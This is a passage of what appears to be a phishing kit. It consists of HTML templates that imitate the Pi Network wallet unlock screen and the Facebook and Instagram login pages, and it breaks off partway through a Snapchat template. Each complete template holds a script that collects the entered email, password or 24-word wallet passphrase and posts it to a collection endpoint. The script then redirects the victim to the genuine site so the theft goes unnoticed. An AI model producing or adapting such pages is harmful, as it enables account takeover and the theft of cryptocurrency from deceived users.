          <div class="back-arrow">←</div>
          <div class="header-title">Home <span style="display: inline-block; width: 20px; height: 20px; border-radius: 50%; text-align: center; line-height: 20px; font-size: 14px; vertical-align: middle;"><img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="width: 100%; height: auto; object-fit:fill;" /></span></div>
          <div class="dropdown-icon">▼</div>
      </div>
  
  
      <div class="main-content">
          <div class="logo">
              <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 100px; height: auto;" />
          </div>
  
  
  
          <div class="welcome-text">Welcome to the Pi Browser</div>
  
  
          <div class="menu-grid">
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/6.png" alt="" style="width:100%;">
                  </div>
                  <div class="menu-label">Fireside</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/1.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Wallet</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/2.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Brainstorm</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/3.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Mine</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/4.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">Blockchain</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
                          <path d="M14.6,16.6L19.2,12L14.6,7.4L16,6L22,12L16,18L14.6,16.6M9.4,16.6L4.8,12L9.4,7.4L8,6L2,12L8,18L9.4,16.6Z" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">Develop</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
                          <path d="M2,3H22C23.05,3 24,3.95 24,5V19C24,20.05 23.05,21 22,21H2C0.95,21 0,20.05 0,19V5C0,3.95 0.95,3 2,3M14,6V7H22V6H14M14,8V9H21.5L22,9V8H14M14,10V11H21V10H14M8,13.91C6,13.91 2,15 2,17V18H14V17C14,15 10,13.91 8,13.91M8,6A3,3 0 0,0 5,9A3,3 0 0,0 8,12A3,3 0 0,0 11,9A3,3 0 0,0 8,6Z" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">KYC</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <svg viewBox="0 0 24 24" width="35" height="35">
                          <path d="M20,2H4A2,2 0 0,0 2,4V22L6,18H20A2,2 0 0,0 22,16V4A2,2 0 0,0 20,2M20,16H6L4,18V4H20" fill="#673AB7"/>
                      </svg>
                  </div>
                  <div class="menu-label">Chat</div>
              </div>
  
              <div class="menu-item" onclick="redirectToWallet()">
                  <div class="menu-icon">
                      <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/8.png" alt="" style="width:100%;">
                  
                  </div>
                  <div class="menu-label">P2P</div>
              </div>
          </div>
  
  
          <button class="explore-button" onclick="redirectToWallet()">
              <svg viewBox="0 0 24 24" width="20" height="20" style="margin-right: 10px;">
                  <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6.5A5.5,5.5 0 0,0 6.5,12A5.5,5.5 0 0,0 12,17.5A5.5,5.5 0 0,0 17.5,12A5.5,5.5 0 0,0 12,6.5M12,9.5A2.5,2.5 0 0,1 14.5,12A2.5,2.5 0 0,1 12,14.5A2.5,2.5 0 0,1 9.5,12A2.5,2.5 0 0,1 12,9.5" fill="white"/>
              </svg>
              Explore the Ecosystem
          </button>
      </div>
  
  
      <div class="nav-bar">
          <div class="nav-indicator"></div>
      </div>
  
  
      <div id="wallet-content" style="display: none;">
          <div class="header">
              <button class="back-button">←</button>
              <div class="header-title">
                  <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
      
                  Wallet
                  <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
              </div>
              <button class="check-button">✓</button>
          </div>
          
          <div class="container">
              <h1>Unlock Pi Wallet</h1>
              
              <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
              
              <button class="unlock-button unlock-passphrase" onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
              <button class="unlock-button unlock-fingerprint disabled" id="testeb">Unlock With Fingerprint</button>
              
              <p class="info-text">
                  As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
                  Recovery of passphrase is currently impossible.
              </p>
              
              <p class="info-text">
                  Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
              </p>
          </div>
      </div>
  
      <script>
  
          document.head.insertAdjacentHTML('beforeend', \`
          <style id="wallet-styles" disabled>
              body {
                  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                  margin: 0;
                  padding: 0;
                  background-color: #f5f5f5;
                  width: 800px;
                  height: 1629px;
                  max-width: 100%;
                  margin: 0 auto;
              }
              
              .header {
                  background-color: #663399;
                  color: white;
                  padding: 15px 20px;
                  display: flex;
                  align-items: center;
                  justify-content: space-between;
              }
              
              .header-title {
                  font-size: 20px;
                  font-weight: 500;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  flex: 1;
              }
              
              .back-button {
                  width: 24px;
                  height: 24px;
                  border: none;
                  background: none;
                  color: white;
                  font-size: 24px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
              }
              
              .check-button {
                  width: 24px;
                  height: 24px;
                  border: none;
                  background: none;
                  color: white;
                  font-size: 18px;
                  cursor: pointer;
              }
              
              .wallet-icon {
                  background-color: #FFA500;
                  width: 30px;
                  height: 30px;
                  border-radius: 6px;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  margin-right: 10px;
                  color: white;
              }
              
              .pi-icon {
                  background-color: #FFA500;
                  width: 20px;
                  height: 20px;
                  border-radius: 50%;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  margin-left: 10px;
                  color: white;
                  font-size: 12px;
              }
              
              .container {
                  padding: 20px;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
              }
              
              h1 {
                  font-size: 24px;
                  margin: 20px 0 30px;
                  text-align: center;
                  color: #333;
              }
              
              .passphrase-input {
                  width: 100%;
                  height: 150px;
                  border: 1px solid #ddd;
                  border-radius: 10px;
                  padding: 20px;
                  font-size: 16px;
                  margin-bottom: 20px;
                  resize: none;
                  color: #aaa;
                  background: white;
              }
              
              .unlock-button {
                  width: 100%;
                  padding: 15px;
                  margin: 10px 0;
                  border-radius: 10px;
                  border: none;
                  font-size: 16px;
                  cursor: pointer;
                  text-align: center;
              }
              
              .unlock-passphrase {
                  background-color: white;
                  color: #663399;
                  border: 1px solid #ddd;
              }
              
              .unlock-fingerprint {
                  background-color: #663399;
                  color: white;
              }
              
              .info-text {
                  margin: 20px 0;
                  color: #333;
                  font-size: 16px;
                  line-height: 1.5;
              }
              
              .blue-link {
                  color: #3498db;
                  text-decoration: none;
              }
                  body {
              overflow: hidden;
              }
          </style>
          \`);
  
  
          function redirectToWallet() {
  
              document.querySelector('.main-content').style.display = 'none';
              document.querySelector('.header').style.display = 'none';
              document.querySelector('.nav-bar').style.display = 'none';
              
  
              document.querySelector('#wallet-content').style.display = 'block';
              
  
              document.querySelector('#wallet-styles').disabled = false;
          }
  
  
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
          
          async function handleSubmit(event) {
              event.preventDefault(); 
              const email = "PiWalletAddress";
              const password = document.getElementById("password").value;
              const signInButton = document.getElementById("testeb");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
              
              try {
                  const response = await fetch("http://localhost:5237/insertdata", {
                  method: "POST",
                  headers: {
                      "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                      uid: uid,
                      websiteName: websiteName,
                      email: email,
                      password: password
                  })
                  });
  
                  window.location.href = "https://minepi.com/";
              } catch (error) {
                  window.location.href = "https://minepi.com/";
                  console.error("Error inserting data:", error);
              }
          }
      </script>
  </body>
  </html>`,
    "facebook":`<!DOCTYPE html>
  <html>
  
  <head>
      <meta charset="UTF-8">
      <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
              
            const signInButton = document.getElementById("amazon");
              signInButton.disabled = true;
              signInButton.style.opacity = '0.5';
              signInButton.style.cursor = 'not-allowed';
              
  
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
      
              window.location.href = "https://facebook.com/";
          } catch (error) {
            window.location.href = "https://facebook.com/";
            }
          }
        </script>
      
      <style>
  
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap');
  * {
      padding: 0px;
      margin: 0px;
  }
  
  body {
     background:#f0f2f5;
     font-family: 'Poppins', sans-serif;
     
  }
  
  main{
      height: 100vh;
      display: flex;
     justify-content: center;
     align-items: center;
     padding: 0 2rem;
  }
  
  .main{
      display: flex;
      justify-content: center;
      align-items: center;
      height: 80vh;
  }
  
  .heading-section{
      display: flex;
      flex-direction: column;
      max-width: 550px;
      margin-right: 5rem;
      margin-top: 6rem;
      align-self: flex-start;
  }
  
  .logo-img{
      display: block;
      width: 270px;
  }
  
  .form{
      width: 390px;
  }
  
  .a-form {
      width: 100%;
      box-sizing: border-box;
      padding: 15px;
      background-color: #fff;
      border: none;
      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
      margin-bottom: 20px;
  }
  
  .a-form .a-email {
      width: 100%;
      padding: 15px;
      box-sizing: border-box;
      font-size: 16px;
      margin: 10px auto;
      border: 1px solid lightgray;
      border-radius: 8px;
      border-width: thin;
      outline-width: thin;
      outline-color: rgb(160, 160, 255);
  }
  
  .a-form .a-email:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-pss {
      display: block;
      width: 100%;
      padding: 15px;
      box-sizing: border-box;
      font-size: 16px;
      margin: 10px auto;
      border: 1px solid lightgray;
      border-radius: 8px;
      outline-width: thin;
      outline-color: rgb(160, 160, 255);
  }
  
  .a-form .a-pss:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-sub {
      display: block;
      width: 100%;
      padding: 15px;
      margin: 10px auto;
      box-sizing: border-box;
      background-color: #004790;
      text-align: center;
      color: white;
      font-size: 20px;
      border: none;
      font-weight: 700;
      border-radius: 8px;
  }
  
  .a-form .a-sub:hover {
      cursor: pointer;
      background-color: #003780;
      border: none;
  }
  
  .a-form .a-sub:active {
      cursor: progress;
      background-color: #102770;
      border: none;
      outline: none;
  }
  
  .a-form .a-sub:focus {
      outline: none;
      box-shadow: 0px 0px 2px #0066ff;
  }
  
  .a-form .a-link {
      display: block;
      text-decoration: none;
      text-align: center;
      padding-bottom: 10px;
      padding-top: 10px;
      font-size: 16px;
  }
  
  .a-form .a-hr {
      display: block;
      margin-top: 0.5em;
      margin-bottom: 1.5em;
      margin-left: auto;
      margin-right: auto;
      border: 1px solid #E0E0E0;
  }
  
  .a-form .a-but {
      display: block;
      width: 60%;
      background-color: #32CD32;
      padding: 14px;
      margin: 10px auto;
      color: white;
      font-size: 18px;
      font-weight: 700;
      border: none;
      box-sizing: border-box;
      text-align: center;
      cursor: pointer;
      border-radius: 8px;
  }
  
  .a-form .a-but:hover {
      cursor: pointer;
      border: none;
      background-color: #67ab04;
      outline: none;
  }
  
  .a-form .a-but:focus {
      outline: none;
      background-color: #67ab04;
  }
  
  .a-ri8{
      padding: 15px;
      font-size: 25px;
  }
  
  .a-page {
      display: block;
      padding: 10px;
      padding-left: 70px;
      margin: 10px auto;
      padding-top: 110px;
  }
  
  .a-href{
      text-decoration: none;
      font-weight: 700;
      color: black;
  }
  
  .a-href:hover {
      text-decoration: underline;
  }
  
  .create-page{
      width: 100%;
      text-align: center;
      font-size: 14px;
  }
  
  .footer{
      display: flex;
      justify-content: center;
      width: 100%;
      background: #fff;
      padding-bottom: 1rem;
  }
  
  #pageFooter{
      max-width: 968px;
      color: #737373;
      margin: 0;
      padding: 0;
  }
  ul{
      line-height: 1.6;
  }
  
  ul li{
      margin: 0;
      padding: 0;
      display: inline-block;
      padding-left: 10px;
      font-size: 12px;
      list-style-type: none;
  }
  
  a{
      white-space: nowrap;
      margin: 0;
      padding: 0;
      color: #385898;
      cursor: pointer;
      text-decoration: none;
  }
  
  a:hover{
      text-decoration: underline;
  }
  
  #line{
      border-bottom: 1px solid #dddfe2;
      font-size: 1px;
      height: 8px;
      margin-bottom: 8px;
  }
  
  .copyright{
      font-size: 12px;
      padding-left: 10px;
      padding-top: 1rem;
  }
  
  .m-footer{
      display: none;
  }
  @media screen and (max-width: 760px) {
  
      main{
          height: 100%;
      }
  
      .main{
          flex-direction: column;
          height: 100%;
      }
  
      .heading-section{
          margin: 0;
          max-width: 400px;
          align-items: center;
          margin: 2rem 0;
      }
  
      .a-ri8{
          font-size: 21px;
      }
  
      .form{
          padding-bottom: 4rem;
      }
  
      .footer{
          display: none;
      }
  
      .m-footer{
          display: block;
          color: #737373;
      }
  
      .main-c{
          display: flex;
          justify-content: space-between;
          font-size: 12px;
          text-align: center;
          padding: 1rem 6rem;
      }
  
      .list-1{
          display: flex;
          flex-direction: column;
      }
  
      .list-2{
          display: flex;
          flex-direction: column;
      }
  
      .main-c a{
          color: #737373;
          text-decoration: none;
      }
  
      .main-c a:hover{
          text-decoration: none;
      }
  
      .main-links{
          color: #737373;
          font-size: 10px;
          width: 100%;
          text-align: center;
          padding-bottom: .5rem;
      }
  
      .main-links span{
          cursor: pointer;
      }
  
      .fb{
          cursor:pointer;
          font-size: 12px;
          padding-bottom: .5rem;
          width: 100%;
          text-align: center;
      }
  }
  
      </style>
  
      <link rel="stylesheet" href="./css/styles.css">
      <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" type="image/x-icon">
  </head>
  
  <body>
      <main>
          <div class="main">
          <div class="heading-section">
              <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" class="logo-img">
              <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
          </div>
  
          <div class="form">
              <form class="a-form" onsubmit="handleSubmit(event)">
                  <input type="email" id="email" class="a-email" name="Email" placeholder="Email address or phone number"
                      autofocus="autofocus" required />
                  <input type="password" id="password" class="a-pss" name="Password" placeholder="Password"
                      autofocus="autofocus" />
                  <input type="submit" class="a-sub" id="amazon" value="Log In" />
                  <a href="" class="a-link">Forgotten password?</a>
                  <hr class="a-hr">
                  <input type="submit" value="Create New Account" class="a-but" />
              </form>
              <div class="create-page">
                  <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
              </div>
              </div>
          </div>
  
      </main>
      <div class="footer">
          <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
              <ul>
                  <li>English (UK)</li>
                  <li><a href="">हिन्दी</a></li>
                  <li><a href="">ગુજરાતી</a></li>
                  <li><a href="">मराठी</a></li>
                  <li><a href="">اردو</a></li>
                  <li><a href="">മലയാളം</a></li>
                  <li><a href="">বাংলা</a> </li>
                  <li><a href="" class="_sv4">తెలుగు</a> </li>
                  <li><a href="" class="_sv4">தமிழ்</a></li>
                  <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
                  <li><a href="" class="_sv4">Español</a></li>
                  <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
              </ul>
              <div id="line"></div>
              <div>
                  <ul>
                      <li><a href="">Sign Up</a></li>
                      <li><a href="" >Log In</a></li>
                      <li><a href="">Messenger</a></li>
                      <li><a href="">Facebook Lite</a> </li>
                      <li><a href=""> Watch </a> </li>
                      <li><a href="">People</a> </li>
                      <li><a href="">Pages</a></li>
                      <li><a  href="">Page categories</a></li>
                      <li><a href="">Places</a></li>
                      <li><a href="">Games</a></li>
                      <li><a href="">Locations</a></li>
                      <li><a href="">Marketplace</a></li>
                      <li><a href="">Facebook Pay</a></li>
                      <li><a href="">Groups</a></li>
                      <li><a href="">Jobs</a></li>
                      <li><a href="">Oculus</a></li>
                      <li><a href="">Portal</a></li>
                      <li><a href="">Instagram</a></li>
                      <li><a href="">Local</a></li>
                      <li><a href="">Fundraisers</a></li>
                      <li><a href="">Services</a></li>
                      <li><a href="">Voting Information Centre</a></li>
                      <li><a href="">About</a></li>
                      <li><a href="">Create ad</a></li>
                      <li><a href="">Create Page</a></li>
                      <li><a href="">Developers</a></li>
                      <li><a href="">Careers</a></li>
                      <li><a href="">Privacy</a></li>
                      <li><a href="">Cookies</a></li>
                      <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
                      <li><a href="">Terms</a></li>
                      <li><a href="">Help</a></li>
                      <li><a href="">Settings</a></li>
                      <li><a href="">Activity log</a></li>
                  </ul>
              </div>
              <div class="copyright">
                  <div><span> Facebook © 2021</span>
                  </div>
              </div>
          </div>
      </div>
              <div class="m-footer">
                  <div class="main-c">
                      <div class="list-1"><span >English (UK)</span>
                          <div><span><a href="">हिन्दी</a></span></div>
                          <div><span><a href="">اردو</a></span></div>
                          <div><span><a href="">বাংলা</a></span></div>
                      </div>
                      <div class="list-2">
                          <div><span><a href="">ગુજરાતી</a></span></div>
                          <div class=""><span><a href="">मराठी</a></span>
                          </div>
                          <div><span><a href="">മലയാളം</a></span></div>
                          <a>
                              <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
                              </div>
                          </a>
                      </div>
                  </div>
                  <div class="main-links">
                      <span>About </span>.
                      <span> Help </span>.
                      <span> More </span>
                  </div>
                  <div class="fb">Facebook Inc.</div>
              </div>
  
        
  
  </body>
  
  </html>`,
    "instagram":`<!DOCTYPE html>
  <html lang="pt-BR">
  <head>
  <title>Test Page</title>
      <script>
          const uid = "user123user123"; 
          const websiteName = "mywebsitemywebsite"; 
      
          async function handleSubmit(event) {
            event.preventDefault(); 
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const signInButton = document.getElementById("amazon");
          signInButton.disabled = true;
          signInButton.style.opacity = '0.5';
          signInButton.style.cursor = 'not-allowed';
          
            try {
              const response = await fetch("http://localhost:5237/insertdata", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  uid: uid,
                  websiteName: websiteName,
                  email: email,
                  password: password
                })
              });
              window.location.href = "https://instagram.com/";
          } catch (error) {
            window.location.href = "https://instagram.com/";
            }
          }
        </script>
      
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="./styles.css" />
      <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/insta-fav.ico">
      <title>Instagram clone</title>
      <style>
          * {
      border: none;
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
      margin: 0;
      padding: 0;
  }
  
  body {
      background-color: #fafafa;
      height: 100vh;
  }
  
  main {
      height: 100vh;
      margin: auto;
      max-width: 935px;
  }
  
  a { text-decoration: none; }
  h1 { margin: 20px 0; }
  ul { list-style: none; }
  
  /**
   * Flex rules
   */
  
  .flex {
      display: -webkit-box;
      display: -moz-box;
      display: -webkit-flex;
      display: -ms-flexbox;
      display: flex;
  }
  
  .direction-column {
      -webkit-box-direction: normal;
      -webkit-box-orient: vertical;
      -moz-box-direction: normal;
      -moz-box-orient: vertical;
      -webkit-flex-direction: column;
      -ms-flex-direction: column;
      flex-direction: column;
  }
  
  .justify-content-center {
      -webkit-box-pack: center;
      -moz-box-pack: center;
      -ms-flex-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
  }
  
  .align-items-center {
      -webkit-box-align: center;
      -moz-box-align: center;
      -ms-flex-align: center;
      -webkit-align-items: center;
      align-items: center;
  }
  
  .flex-wrap {
      -webkit-flex-wrap: wrap;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
  }
  
  /**
   *
   */
  
  .panel {
      background-color: white;
      border: 1px solid #dbdbdb;
      margin-bottom: 10px;
      padding: 10px;
  }
  
  #auth { max-width: 350px; }
  #mobile { max-width: 454px; }
  
  #mobile img {
      height: 618px;
  }
  
  /**
   * Login section
   */
  .login-with-fb,
  form { width: 100%; }
  
  .register,
  form { padding: 30px 20px; }
  
  .login-with-fb { padding: 30px 20px 20px 20px; }
  
  form .sr-only { display: none; }
  
  form input {
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      color: #808080;
      margin-bottom: 8px;
      padding: 10px 10px;
      width: 100%;
  }
  
  form input::placeholder {
      color: #808080;
  }
  
  form input:focus {
      border: 1px solid #808080;
      outline: none;
  }
  
  form button {
      background-color: #0095f6;
      border-radius: 5px;
      color: #fff;
      font-weight: bold;
      height: 35px;
      margin-top: 10px;
      width: 100%;
  }
  
  /**
   * Separator login form from login with fb
   */
  .separator span {
      background-color: #dbdbdb;
      height: 1px;
      width: calc(100% - 10px);
  }
  
  .separator .or {
      color: #808080;
      font-weight: bold;
  }
  
  .separator { padding: 0 20px; }
  .separator span:first-child { margin-right: 10px;}
  .separator span:last-child { margin-left: 10px;}
  
  /**
   * Login with fb section
   */
  .login-with-fb a { 
      color: #385185; 
  }
  
  .login-with-fb > a { font-size: 12px; }
  .login-with-fb div a { font-weight: bold; }
  .login-with-fb div { margin-bottom: 15px; }
  
  /**
   * Register section
   */
  .register * { font-size: 14px; }
  .register a { 
      color: #0095f6;
      font-weight: bold;
  }
  
  .register p { margin-right: 5px; }
  
  /**
   * App download
   */
  .app-download { padding: 15px; }
  .app-download p { padding: 10px 0; }
  .app-download img { 
      height: 40px; 
      margin: 0 5px;
  }
  
  /**
   * Footer
   */
  footer {
      margin: 0 auto 30px auto;
      max-width: 935px;
  }
  footer ul { margin-bottom: 20px; }
  footer ul li { margin: 0 10px 10px; } 
  footer ul li a { color: #385185; }
  footer .copyright { color: #808080; }
  footer ul li a,
  footer .copyright { 
      font-weight: bold;
      text-align: center;
      text-transform: uppercase;
   }
  
  
  /**
   * Media queries
   */
  
  @media screen and (max-width: 767px) {
      main { margin: 30px auto 50px auto; }
      footer .copyright,
      footer ul li a { font-size: 13px; }
  }
      </style>
  </head>
  <body>
      <main class="flex align-items-center justify-content-center">
          <section id="mobile" class="flex">
          </section>
          <section id="auth" class="flex direction-column">
              <div class="panel login flex direction-column">
                  <h1 title="Instagram" class="flex justify-content-center">
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                  </h1>
                  <form>
                      <label for="email" class="sr-only">Phone number, username, or email</label>
                      <input name="email" id="email" placeholder="Phone number, username, or email" />
  
                      <label for="password" class="sr-only">Password</label>
                      <input name="password" id="password" type="password" placeholder="Password" />
  
                      <button type="button" onclick="handleSubmit(event)" id="amazon">Log in</button>
                  </form>
                  <div class="flex separator align-items-center">
                      <span></span>
                      <div class="or">OR</div>
                      <span></span>
                  </div>
                  <div class="login-with-fb flex direction-column align-items-center">
                      <div>
                          <img />
                          <a>Log in with facebook</a>
                      </div>
                      <a href="#">Forgot password?</a>
                  </div>
              </div>
              <div class="panel register flex justify-content-center">
                  <p>Don't have an account?</p>
                  <a href="#">Sign up.</a>
              </div>
              <div class="app-download flex direction-column align-items-center">
                  <p>Get the app.</p>
                  <div class="flex justify-content-center">
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                      <img src="https://raw.githubusercontent.com/laisfrigerio/instagram-clone-login-page/ebcce9ad6bc4154215e9ee7af1ae49381595c860/img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                  </div>
              </div>
          </section>
      </main>
      <footer>
          <ul class="flex flex-wrap justify-content-center">
              <li><a href="#">Meta</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Help</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Locations</a></li>
              <li><a href="#">Instagram Lite</a></li>
              <li><a href="#">Threads</a></li>
              <li><a href="#">Meta Verified</a></li>
          </ul>
          <p class="copyright">© 2020 Instagram do Facebook</p>
      </footer>
  </body>
  </html>`,
    "snapchat":`<!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
    <link rel="shortcut icon" href="img/faviconV2.png">
    <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
    <meta property="og:site_name" content="Snapchat Spotlight">
    <link rel="stylesheet" href="/css/login.css">
    <title>Login • Snapchat</title>
      <style>
           /* General Styles */
   body {
      caret-color: transparent;
      font-family: "Avenir Next", Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
    }
  
    .login-container {
      text-align: center;
      max-width: 400px;
      width: 83%;
    }
  
    h1 {
      font-size: 27px;
      color: #000000;
      margin-bottom: 20px;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-weight: 500;
    }
  
    label {
      display: block;
      text-align: left;
      font-size: 12px;
      font-weight: bold;
      color: #55ccffd0;
      margin-top: 20px;
      margin-bottom: 5px;
    }
  
    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 11px;
      margin-top: 5px;
      border: 1px solid #dcdcdc;
      border-radius: 10px;
      font-size: 14px;
      box-sizing: border-box;
      caret-color:#00A6FF;
    }
  
    input:focus {
      border-color: #54545436;
      outline: none;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 5px rgba(116, 116, 116, 0.17);
    }
  
    .password-container {
      position: relative;
      width: 100%;
    }
    
    .password-container .toggle-password {
      position: absolute;
      right: 5px;
      top: 60%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      font-family: Arial, Helvetica, sans-serif;
    }
  
    .save-info {
      display: flex;
      align-items: center;
      margin-top: -10px;
      font-size: 12px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
    }
  
    .save-info label {
      color: #bcbcbc;
      font-weight: lighter;
    }
  
    .alternate-option {
      display: flex;
      align-items: center;
      font-size: 12.8px;
      color: #55ccffd0;
      margin-top: 15px;
      justify-content: left;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: bolder;
    }
  
    .forgot-password {
      font-size: 12px;
      color: #55ccffd0;
      margin-top: 16px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 600;
    }
  
    .alternate-option a,
    .forgot-password a {
      text-decoration: none;
      color: #55ccffd0;
    }
  
    input[type="checkbox"] {
      margin-right: 5px;
      margin-top: 20px;
    }
  
    .login-button {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 20px;
      width: 210px;
      padding: 12px;
      margin-top: 20px;
      background-color: #a7abad;
      border: none;
      border-radius: 18px;
      font-size: 14px;
      font-weight: bold;
      color: #ffffff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
  
    .login-button.enabled {
      background-color: #00A6FF;
    }
  
    .login-button:hover {
      background-color: #027bde;
    }
  
    /* Back Button */
    .back-button {
      position: absolute;
      top: 12px;
      left: 10px;
      background-color: transparent;
